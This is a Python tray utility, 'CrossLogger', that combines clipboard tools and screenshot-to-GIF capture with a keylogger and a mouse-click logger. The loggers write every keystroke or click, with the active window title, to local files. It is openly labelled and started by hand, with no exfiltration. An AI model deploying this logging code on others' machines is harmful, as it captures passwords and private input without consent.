#!/usr/bin/env python3
import time
import pyperclip
import pystray
from PIL import Image, ImageDraw, ImageGrab
from threading import Thread
from pynput import keyboard, mouse
import pygetwindow as gw
import platform

# =========================
# Clipboard
# =========================
def clean_formatting():
    pyperclip.copy(pyperclip.paste())

def clear_clipboard():
    pyperclip.copy("")

def uppercase_clipboard():
    pyperclip.copy(pyperclip.paste().upper())

def lowercase_clipboard():
    pyperclip.copy(pyperclip.paste().lower())

# =========================
# Active window (cross)
# =========================
def get_active_window():
    try:
        win = gw.getActiveWindow()
        return win.title if win else "Unknown"
    except:
        return "Unknown"

# =========================
# Screenshot → GIF
# =========================
frames = []

def capture_screen():
    try:
        frames.append(ImageGrab.grab())
        print("Screenshot captured")
    except Exception as e:
        print("Screenshot error:", e)

def save_gif():
    if not frames:
        return
    name = f"screens_{int(time.time())}.gif"
    frames[0].save(name, save_all=True, append_images=frames[1:], duration=500, loop=0)
    frames.clear()
    print("GIF saved:", name)

# =========================
# Keylogger
# =========================
key_log = "key_log.txt"
key_listener = None

def on_key_press(key):
    with open(key_log, "a", encoding="utf-8") as f:
        f.write(f"{time.ctime()} | {key} | {get_active_window()}\n")

def start_keylogger():
    global key_listener
    if not key_listener:
        key_listener = keyboard.Listener(on_press=on_key_press)
        key_listener.start()

def stop_keylogger():
    global key_listener
    if key_listener:
        key_listener.stop()
        key_listener = None

# =========================
# Mouse logger
# =========================
mouse_log = "mouse_log.txt"
mouse_listener = None

def on_click(x, y, button, pressed):
    if pressed:
        with open(mouse_log, "a", encoding="utf-8") as f:
            f.write(f"{time.ctime()} | {button} | ({x},{y}) | {get_active_window()}\n")

def start_mouse_logger():
    global mouse_listener
    if not mouse_listener:
        mouse_listener = mouse.Listener(on_click=on_click)
        mouse_listener.start()

def stop_mouse_logger():
    global mouse_listener
    if mouse_listener:
        mouse_listener.stop()
        mouse_listener = None

# =========================
# Tray
# =========================
def tray_icon():
    img = Image.new("RGB", (64, 64), "black")
    d = ImageDraw.Draw(img)
    d.text((10, 20), "LOG", fill="white")
    return img

def quit_app(icon, item):
    stop_keylogger()
    stop_mouse_logger()
    icon.stop()

icon = pystray.Icon(
    "CrossLogger",
    tray_icon(),
    f"CrossLogger ({platform.system()})",
    menu=pystray.Menu(
        pystray.MenuItem("Clean clipboard", lambda _: clean_formatting()),
        pystray.MenuItem("Clear clipboard", lambda _: clear_clipboard()),
        pystray.MenuItem("Uppercase", lambda _: uppercase_clipboard()),
        pystray.MenuItem("Lowercase", lambda _: lowercase_clipboard()),
        pystray.MenuItem("Capture screen", lambda _: capture_screen()),
        pystray.MenuItem("Save GIF", lambda _: save_gif()),
        pystray.MenuItem("Start keylogger", lambda _: start_keylogger()),
        pystray.MenuItem("Stop keylogger", lambda _: stop_keylogger()),
        pystray.MenuItem("Start mouse logger", lambda _: start_mouse_logger()),
        pystray.MenuItem("Stop mouse logger", lambda _: stop_mouse_logger()),
        pystray.MenuItem("Quit", quit_app)
    )
)

Thread(target=icon.run, daemon=True).start()
time.sleep(999999)
